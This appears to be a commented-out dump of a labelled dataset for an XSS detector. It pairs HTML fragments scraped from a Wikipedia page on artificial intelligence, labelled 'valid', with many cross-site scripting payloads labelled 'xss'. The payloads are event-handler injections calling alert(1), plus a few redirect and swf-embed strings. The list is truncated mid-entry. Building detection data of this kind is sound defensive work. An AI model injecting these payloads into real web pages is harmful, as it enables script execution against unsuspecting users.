#  {'pattern': '</span> </h4>', 'type': 'valid'},
#  {'pattern': '<small onbeforecut="alert(1)" contenteditable>test</small>',
#   'type': 'xss'},
#  {'pattern': '<article draggable="true" ondragstart="alert(1)">test</article>',
#   'type': 'xss'},
#  {'pattern': '<cite onkeyup="alert(1)" contenteditable>test</cite>',
#   'type': 'xss'},
#  {'pattern': '<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<data onpointerleave=alert(1)>xss</data>', 'type': 'xss'},
#  {'pattern': '<audio draggable="true" ondragend="alert(1)">test</audio>',
#   'type': 'xss'},
#  {'pattern': '</span>(2012) </li>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/juggling_robot" title="juggling robot">juggling </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-footnotewengmcclellandpentlandsporns2001-168"><span class="mw-cite-backlink"><b><a href="#cite_ref-footnotewengmcclellandpentlandsporns2001_168-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<dd onbeforecopy="alert(1)" contenteditable>test</dd>',
#   'type': 'xss'},
#  {'pattern': '</span> </li>', 'type': 'valid'},
#  {'pattern': '<del id=x tabindex=1 onactivate=alert(1)></del>', 'type': 'xss'},
#  {'pattern': '<svg onbeforecut="alert(1)" contenteditable>test</svg>',
#   'type': 'xss'},
#  {'pattern': '<li id="cite_note-262"><span class="mw-cite-backlink"><b><a href="#cite_ref-262">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<li class="toclevel-2 tocsection-15"><a href="#cybernetics_and_brain_simulation"><span class="tocnumber">5.1',
#   'type': 'valid'},
#  {'pattern': '<optgroup onpointerover=alert(1)>xss</optgroup>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '</li><li style="min-height: 31px;"><span style="display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;"><img alt="" src="//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/wikibooks-logo.svg/27px-wikibooks-logo.svg.png" decoding="async" width="27" height="27" style="vertical-align: middle" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/wikibooks-logo.svg/41px-wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/wikibooks-logo.svg/54px-wikibooks-logo.svg.png 2x" data-file-width="300" data-file-height="300" />',
#   'type': 'valid'},
#  {'pattern': '<audio onpointermove=alert(1)>xss</audio>', 'type': 'xss'},
#  {'pattern': '<aside onmouseout="alert(1)">test</aside>', 'type': 'xss'},
#  {'pattern': '<div>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/viv_(software)" title="viv (software)">viv </a><span class="nowrap">&#160;',
#   'type': 'valid'},
#  {'pattern': '</span> </a> </li>', 'type': 'valid'},
#  {'pattern': '<canvas onbeforecut="alert(1)" contenteditable>test</canvas>',
#   'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/> </li>',
#   'type': 'valid'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>',
#   'type': 'xss'},
#  {'pattern': '<tbody draggable="true" ondragenter="alert(1)">test</tbody>',
#   'type': 'xss'},
#  {'pattern': '</span><a href="/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=48" title="edit section: philosophy and ethics">edit </a><span class="mw-editsection-bracket">]',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-robotic_mapping-131"><span class="mw-cite-backlink"><b><a href="#cite_ref-robotic_mapping_131-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<object onmousedown="alert(1)">test</object>', 'type': 'xss'},
#  {'pattern': '<area onbeforepaste="alert(1)" contenteditable>test</area>',
#   'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<ul><li><a href="#citerefkurzweil1999">kurzweil 1999 </a> and <a href="#citerefkurzweil2005">kurzweil 2005 </a> </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<template onpointerout=alert(1)>xss</template>', 'type': 'xss'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/>',
#   'type': 'valid'},
#  {'pattern': '<s onpointerup=alert(1)>xss</s>', 'type': 'xss'},
#  {'pattern': '<select draggable="true" ondrag="alert(1)">test</select>',
#   'type': 'xss'},
#  {'pattern': '<a onmouseup="alert(1)">test</a>', 'type': 'xss'},
#  {'pattern': '</div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">related techniques </th><td class="navbox-list navbox-odd hlist" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-59"><span class="mw-cite-backlink"><b><a href="#cite_ref-59">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=alert(1)></pre>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/photo_manipulation" title="photo manipulation">image manipulation </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style="position:absolute;" onanimationcancel="alert(1)"></a>',
#   'type': 'xss'},
#  {'pattern': '<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<time onclick="alert(1)">test</time>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<canvas onbeforepaste="alert(1)" contenteditable>test</canvas>',
#   'type': 'xss'},
#  {'pattern': '<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/centre_for_the_study_of_existential_risk" title="centre for the study of existential risk">centre for the study of existential risk </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li><cite id="citereflenatguha1989" class="citation book"><a href="/wiki/douglas_lenat" title="douglas lenat">lenat, douglas </a>; guha, r. v. (1989). <i>building large knowledge-based systems </i>. addison-wesley. <a href="/wiki/international_standard_book_number" title="international standard book number">isbn </a>&#160;<a href="/wiki/special:booksources/978-0-201-51752-1" title="special:booksources/978-0-201-51752-1"><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:book&amp;rft.genre=book&amp;rft.btitle=building large knowledge-based systems&amp;rft.pub=addison-wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=lenat&amp;rft.aufirst=douglas&amp;rft.au=guha, r. v.&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-brain_simulation-153"><span class="mw-cite-backlink">^ <a href="#cite_ref-brain_simulation_153-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-brain_simulation_153-1"><sup><i><b>b </b> </i> </sup> </a>',
#   'type': 'valid'},
#  {'pattern': '<ul><li><cite class="citation book"><a href="/wiki/david_berlinski" title="david berlinski">berlinski, david </a> (2000). <a rel="nofollow" class="external text" href="https://archive.org/details/adventofalgorith0000berl"><i>the advent of the algorithm </i> </a>. harcourt books. <a href="/wiki/international_standard_book_number" title="international standard book number">isbn </a>&#160;<a href="/wiki/special:booksources/978-0-15-601391-8" title="special:booksources/978-0-15-601391-8"><bdi>978-0-15-601391-8 </bdi> </a>. <a href="/wiki/oclc" title="oclc">oclc </a>&#160;<a rel="nofollow" class="external text" href="//www.worldcat.org/oclc/46890682">46890682 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:book&amp;rft.genre=book&amp;rft.btitle=the advent of the algorithm&amp;rft.pub=harcourt books&amp;rft.date=2000&amp;rft_id=info:oclcnum/46890682&amp;rft.isbn=978-0-15-601391-8&amp;rft.aulast=berlinski&amp;rft.aufirst=david&amp;rft_id=https://archive.org/details/adventofalgorith0000berl&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<center onclick="alert(1)">test</center>', 'type': 'xss'},
#  {'pattern': '<h1 draggable="true" ondragleave="alert(1)">test</h1>',
#   'type': 'xss'},
#  {'pattern': '<div onkeyup="alert(1)" contenteditable>test</div>',
#   'type': 'xss'},
#  {'pattern': '<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<dl draggable="true" ondrag="alert(1)">test</dl>',
#   'type': 'xss'},
#  {'pattern': '<div onpointerout=alert(1)>xss</div>', 'type': 'xss'},
#  {'pattern': '</span> </h4>', 'type': 'valid'},
#  {'pattern': '<style>:target {color:red;}</style><slot id=x style="transition:color 1s" ontransitionend=alert(1)></slot>',
#   'type': 'xss'},
#  {'pattern': '<applet onmouseover="alert(1)">test</applet>', 'type': 'xss'},
#  {'pattern': '<figure onbeforecut="alert(1)" contenteditable>test</figure>',
#   'type': 'xss'},
#  {'pattern': '<canvas onmousemove="alert(1)">test</canvas>', 'type': 'xss'},
#  {'pattern': '<h1 onpaste="alert(1)" contenteditable>test</h1>',
#   'type': 'xss'},
#  {'pattern': '<li id="cite_note-ivak1971-253"><span class="mw-cite-backlink"><b><a href="#cite_ref-ivak1971_253-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '</div>', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-footnoterussellnorvig200918.12:_learning_from_examples:_summary-231"><span class="mw-cite-backlink"><b><a href="#cite_ref-footnoterussellnorvig200918.12:_learning_from_examples:_summary_231-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<textarea onpointermove=alert(1)>xss</textarea>', 'type': 'xss'},
#  {'pattern': '</body>', 'type': 'valid'},
#  {'pattern': 'document.write', 'type': 'xss'},
#  {'pattern': '<area onpointerenter=alert(1)>xss</area>', 'type': 'xss'},
#  {'pattern': '<marquee onbeforecut="alert(1)" contenteditable>test</marquee>',
#   'type': 'xss'},
#  {'pattern': '<audio oncontextmenu="alert(1)">test</audio>', 'type': 'xss'},
#  {'pattern': '<isindex onpointerup=alert(1)>xss</isindex>', 'type': 'xss'},
#  {'pattern': '<ul><li><a rel="nofollow" class="external text" href="http://www.ieee-cis.org/">ieee computational intelligence society </a> <a rel="nofollow" class="external text" href="https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/">archived </a> 9 may 2008 at the <a href="/wiki/wayback_machine" title="wayback machine">wayback machine </a> </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<li id="cite_note-330"><span class="mw-cite-backlink"><b><a href="#cite_ref-330">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<strike onmouseup="alert(1)">test</strike>', 'type': 'xss'},
#  {'pattern': '<div id="john_mccarthy" style="font-size:114%;margin:0 4em"><a href="/wiki/john_mccarthy_(computer_scientist)" title="john mccarthy (computer scientist)">john mccarthy </a> </div> </th> </tr><tr><td colspan="2" class="navbox-list navbox-odd" style="width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '<kbd id=x tabindex=1 onfocus=alert(1)></kbd>', 'type': 'xss'},
#  {'pattern': '<table onbeforepaste="alert(1)" contenteditable>test</table>',
#   'type': 'xss'},
#  {'pattern': '<hr draggable="true" ondragleave="alert(1)">test</hr>',
#   'type': 'xss'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/>',
#   'type': 'valid'},
#  {'pattern': '<summary onpaste="alert(1)" contenteditable>test</summary>',
#   'type': 'xss'},
#  {'pattern': '<bdo id=x tabindex=1 onactivate=alert(1)></bdo>', 'type': 'xss'},
#  {'pattern': '<video onmouseout="alert(1)">test</video>', 'type': 'xss'},
#  {'pattern': '<nav onclick="alert(1)">test</nav>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<div style="padding:0em 0.25em">', 'type': 'valid'},
#  {'pattern': '<noembed onkeyup="alert(1)" contenteditable>test</noembed>',
#   'type': 'xss'},
#  {'pattern': '<area draggable="true" ondragstart="alert(1)">test</area>',
#   'type': 'xss'},
#  {'pattern': '<li class="toclevel-3 tocsection-55"><a href="#autonomous_weapons"><span class="tocnumber">8.2.5',
#   'type': 'valid'},
#  {'pattern': '<video onpointermove=alert(1)>xss</video>', 'type': 'xss'},
#  {'pattern': '<input onchange=alert(1) value=xss>', 'type': 'xss'},
#  {'pattern': '<center draggable="true" ondrag="alert(1)">test</center>',
#   'type': 'xss'},
#  {'pattern': '<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>',
#   'type': 'xss'},
#  {'pattern': '<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/christof_koch" title="christof koch">koch, christof </a>, "proust among the machines", <i><a href="/wiki/scientific_american" title="scientific american">scientific american </a> </i>, vol. 321, no. 6 (december 2019), pp.&#160;46–49. <a href="/wiki/christof_koch" title="christof koch">christof koch </a> doubts the possibility of "intelligent" machines attaining <a href="/wiki/consciousness" title="consciousness">consciousness </a>, because "[e]ven the most sophisticated <a href="/wiki/brain_simulation" title="brain simulation">brain simulations </a> are unlikely to produce conscious <a href="/wiki/feelings" class="mw-redirect" title="feelings">feelings </a>." (p.&#160;48.) according to koch, "whether machines can become <a href="/wiki/sentience" title="sentience">sentient </a> [is important] for <a href="/wiki/ethics" title="ethics">ethical </a> reasons. if computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. per gnw [the <a href="/wiki/global_workspace_theory#global_neuronal_workspace" class="mw-redirect" title="global workspace theory">global neuronal workspace </a> theory], they turn from mere objects into subjects... with a <a href="/wiki/point_of_view_(philosophy)" title="point of view (philosophy)">point of view </a>.... once computers\' <a href="/wiki/cognitive_abilities" class="mw-redirect" title="cognitive abilities">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href="/wiki/rights" title="rights">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href="/wiki/pain" title="pain">pain </a> and degradation. the alternative, embodied by iit [integrated information theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself." (p.&#160;49.) </li>',
#   'type': 'valid'},
#  {'pattern': '<keygen onclick="alert(1)">test</keygen>', 'type': 'xss'},
#  {'pattern': '<meter oncut="alert(1)" contenteditable>test</meter>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="https://www.bbc.com/news/technology-35785875">"artificial intelligence: google\'s alphago beats go master lee se-dol" </a>. <i>bbc news </i>. 12 march 2016. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875">archived </a> from the original on 26 august 2016<span class="reference-accessdate">. retrieved <span class="nowrap">1 october',
#   'type': 'valid'},
#  {'pattern': '<strike onpointerover=alert(1)>xss</strike>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<style>:target {color:red;}</style><picture id=x style="transition:color 1s" ontransitionend=alert(1)></picture>',
#   'type': 'xss'},
#  {'pattern': '<main onmousedown="alert(1)">test</main>', 'type': 'xss'},
#  {'pattern': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style="position:absolute;" onanimationcancel="alert(1)"></figcaption>',
#   'type': 'xss'},
#  {'pattern': '</head>', 'type': 'valid'},
#  {'pattern': '<command oncontextmenu="alert(1)">test</command>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>',
#   'type': 'xss'},
#  {'pattern': '<link onkeydown="alert(1)" contenteditable>test</link>',
#   'type': 'xss'},
#  {'pattern': '<ul><li><a href="#citerefmccorduck2004">mccorduck 2004 </a>, pp.&#160;430–435 </li>',
#   'type': 'valid'},
#  {'pattern': '<command onpointerover=alert(1)>xss</command>', 'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal">samuel, a. l. (july 1959). "some studies in machine learning using the game of checkers". <i>ibm journal of research and development </i>. <b>3 </b> (3): 210–229. <a href="/wiki/citeseerx" title="citeseerx">citeseerx </a>&#160;<span class="cs1-lock-free" title="freely accessible"><a rel="nofollow" class="external text" href="//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254">10.1.1.368.2254 </a>',
#   'type': 'valid'},
#  {'pattern': '<input id=x tabindex=1 onactivate=alert(1)></input>',
#   'type': 'xss'},
#  {'pattern': '<tr onpaste="alert(1)" contenteditable>test</tr>',
#   'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<samp onmousemove="alert(1)">test</samp>', 'type': 'xss'},
#  {'pattern': '<script onmousemove="alert(1)">test</script>', 'type': 'xss'},
#  {'pattern': '<td onmouseenter="alert(1)">test</td>', 'type': 'xss'},
#  {'pattern': '<style>@keyframes slidein {}</style><ins style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></ins>',
#   'type': 'xss'},
#  {'pattern': '<form draggable="true" ondragend="alert(1)">test</form>',
#   'type': 'xss'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=wired uk&amp;rft.atitle=the uk is about to start testing self-driving truck platoons&amp;rft.date=2017-08-24&amp;rft.aulast=burgess&amp;rft.aufirst=matt&amp;rft_id=https://www.wired.co.uk/article/uk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<div role="navigation" class="navbox" aria-labelledby="subfields_of_and_cyberneticians_involved_in_cybernetics" style="padding:3px"><table class="nowraplinks mw-collapsible autocollapse navbox-inner" style="border-spacing:0;background:transparent;color:inherit"><tbody><tr><th scope="col" class="navbox-title" colspan="2">',
#   'type': 'valid'},
#  {'pattern': '<iframe onmouseenter="alert(1)">test</iframe>', 'type': 'xss'},
#  {'pattern': '<listing onkeydown="alert(1)" contenteditable>test</listing>',
#   'type': 'xss'},
#  {'pattern': '<svg><ol onload=alert(1)></ol>', 'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<base onmouseover="alert(1)">test</base>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>',
#   'type': 'xss'},
#  {'pattern': '<dt><a class="reference internal" href="topics/deploy.html"><span class="doc">deploying spiders',
#   'type': 'valid'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<keygen onmouseleave="alert(1)">test</keygen>', 'type': 'xss'},
#  {'pattern': '<dd>the brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href="/wiki/hans_moravec" title="hans moravec">hans moravec </a>, <a href="/wiki/ray_kurzweil" title="ray kurzweil">ray kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id="cite_ref-brain_simulation_153-1" class="reference"><a href="#cite_note-brain_simulation-153">&#91;150&#93; </a> </sup> </dd> </dl>',
#   'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<hr id=x tabindex=1 onactivate=alert(1)></hr>', 'type': 'xss'},
#  {'pattern': '</span> </h3>', 'type': 'valid'},
#  {'pattern': '<style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionend=alert(1)></embed>',
#   'type': 'xss'},
#  {'pattern': '<bdo onpointerdown=alert(1)>xss</bdo>', 'type': 'xss'},
#  {'pattern': '</div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%"><a href="/wiki/software_development" title="software development">software development </a> </th><td class="navbox-list navbox-even" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '<blockquote onbeforepaste="alert(1)" contenteditable>test</blockquote>',
#   'type': 'xss'},
#  {'pattern': '</span><span class="mw-editsection"><span class="mw-editsection-bracket">[',
#   'type': 'valid'},
#  {'pattern': '<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<fieldset oncopy="alert(1)" contenteditable>test</fieldset>',
#   'type': 'xss'},
#  {'pattern': '<basefont onpointerup=alert(1)>xss</basefont>', 'type': 'xss'},
#  {'pattern': '<li id="cite_note-378"><span class="mw-cite-backlink"><b><a href="#cite_ref-378">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<li>try the <a class="reference internal" href="faq.html"><span class="doc">faq',
#   'type': 'valid'},
#  {'pattern': '<form ondblclick="alert(1)">test</form>', 'type': 'xss'},
#  {'pattern': '<li><a href="#citereflugerstubblefield2004">luger &amp; stubblefield 2004 </a>, pp.&#160;45–50 </li>',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="toctext">perception', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-decision_tree-217"><span class="mw-cite-backlink"><b><a href="#cite_ref-decision_tree_217-0">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<image srcset=1 onerror=alert(1)>', 'type': 'xss'},
#  {'pattern': '<address id=x tabindex=1 onactivate=alert(1)></address>',
#   'type': 'xss'},
#  {'pattern': '<tr onpointerup=alert(1)>xss</tr>', 'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal">smoliar, stephen w.; zhang, hongjiang (1994). "content based video indexing and retrieval". <i>ieee multimedia </i>. <b>1 </b> (2): 62–72. <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1109/93.311653">10.1109/93.311653 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=ieee multimedia&amp;rft.atitle=content based video indexing and retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info:doi/10.1109/93.311653&amp;rft.aulast=smoliar&amp;rft.aufirst=stephen w.&amp;rft.au=zhang, hongjiang&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<header id=x tabindex=1 onfocus=alert(1)></header>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/computational_geometry" title="computational geometry">computational geometry </a> </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<track onmouseleave="alert(1)">test</track>', 'type': 'xss'},
#  {'pattern': '</span> </li>', 'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/rudolf_steiner" title="rudolf steiner">rudolf steiner </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': 'src="http://ha.ckers.org/.swf" allowscriptaccess="always"',
#   'type': 'xss'},
#  {'pattern': '<content onmouseleave="alert(1)">test</content>', 'type': 'xss'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/>',
#   'type': 'valid'},
#  {'pattern': '<fieldset onmouseover="alert(1)">test</fieldset>',
#   'type': 'xss'},
#  {'pattern': '<tfoot onpointerup=alert(1)>xss</tfoot>', 'type': 'xss'},
#  {'pattern': '<figcaption oncut="alert(1)" contenteditable>test</figcaption>',
#   'type': 'xss'},
#  {'pattern': '<span draggable="true" ondragend="alert(1)">test</span>',
#   'type': 'xss'},
#  {'pattern': 'latest', 'type': 'valid'},
#  {'pattern': '<applet oncut="alert(1)" contenteditable>test</applet>',
#   'type': 'xss'},
#  {'pattern': '<a href="/wiki/file:kismet_robot_at_mit_museum.jpg" class="image">',
#   'type': 'valid'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:book&amp;rft.genre=unknown&amp;rft_id=https://ars.electronica.art/outofthebox/en/digital-humanism-conf/ retrieved september 2019&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style="position:absolute;" onanimationcancel="alert(1)"></q>',
#   'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': 'd="alert(\'\');\\")";', 'type': 'xss'},
#  {'pattern': '<li onmouseup="alert(1)">test</li>', 'type': 'xss'},
#  {'pattern': '<dd>', 'type': 'valid'},
#  {'pattern': '<button onmousedown="alert(1)">test</button>', 'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<span class="mw-editsection-bracket">]', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-393"><span class="mw-cite-backlink"><b><a href="#cite_ref-393">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '<var onbeforecopy="alert(1)" contenteditable>test</var>',
#   'type': 'xss'},
#  {'pattern': '<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '</div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">applied<br />computing </th><td class="navbox-list navbox-odd" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '</dl>', 'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<form action="/w/index.php" id="searchform">', 'type': 'valid'},
#  {'pattern': '<link rel="search" title="search" href="search.html" />',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/gaussian_adaptation" title="gaussian adaptation">gaussian adaptation </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style="position:absolute;" onanimationcancel="alert(1)"></frameset>',
#   'type': 'xss'},
#  {'pattern': '<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<th id=x tabindex=1 onbeforeactivate=alert(1)></th>',
#   'type': 'xss'},
#  {'pattern': '<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<mark draggable="true" ondragleave="alert(1)">test</mark>',
#   'type': 'xss'},
#  {'pattern': '<em onbeforepaste="alert(1)" contenteditable>test</em>',
#   'type': 'xss'},
#  {'pattern': '<menu onkeyup="alert(1)" contenteditable>test</menu>',
#   'type': 'xss'},
#  {'pattern': '</span><a href="/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=42" title="edit section: video games">edit </a><span class="mw-editsection-bracket">]',
#   'type': 'valid'},
#  {'pattern': '<li class="toctree-l1"><a class="reference internal" href="topics/extensions.html">extensions</a></li>',
#   'type': 'valid'},
#  {'pattern': '<wbr oncut="alert(1)" contenteditable>test</wbr>',
#   'type': 'xss'},
#  {'pattern': '<style id=x tabindex=1 onactivate=alert(1)></style>',
#   'type': 'xss'},
#  {'pattern': '<style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=alert(1)></u>',
#   'type': 'xss'},
#  {'pattern': '<section onmouseover="alert(1)">test</section>', 'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/propositional_attitude" title="propositional attitude">propositional attitude </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<title onmouseout="alert(1)">test</title>', 'type': 'xss'},
#  {'pattern': '<li><a href="#citerefrussellnorvig2003">russell &amp; norvig 2003 </a>, pp.&#160;863–898 </li>',
#   'type': 'valid'},
#  {'pattern': '<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>',
#   'type': 'xss'},
#  {'pattern': '<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<acronym onmousemove="alert(1)">test</acronym>', 'type': 'xss'},
#  {'pattern': '<input onpointermove=alert(1)>xss</input>', 'type': 'xss'},
#  {'pattern': "header('location: '.$_get['param']);", 'type': 'xss'},
#  {'pattern': '</span> </h3>', 'type': 'valid'},
#  {'pattern': '<slot oncontextmenu="alert(1)">test</slot>', 'type': 'xss'},
#  {'pattern': '<li id="cite_note-150"><span class="mw-cite-backlink"><b><a href="#cite_ref-150">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '</span> 2015', 'type': 'valid'},
#  {'pattern': '<video draggable="true" ondragleave="alert(1)">test</video>',
#   'type': 'xss'},
# ...
#   'type': 'xss'},
#  {'pattern': '<image3 onpointerenter=alert(1)>xss</image3>', 'type': 'xss'},
#  {'pattern': '<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<caption onmouseup="alert(1)">test</caption>', 'type': 'xss'},
#  {'pattern': '<nextid onbeforecut="alert(1)" contenteditable>test</nextid>',
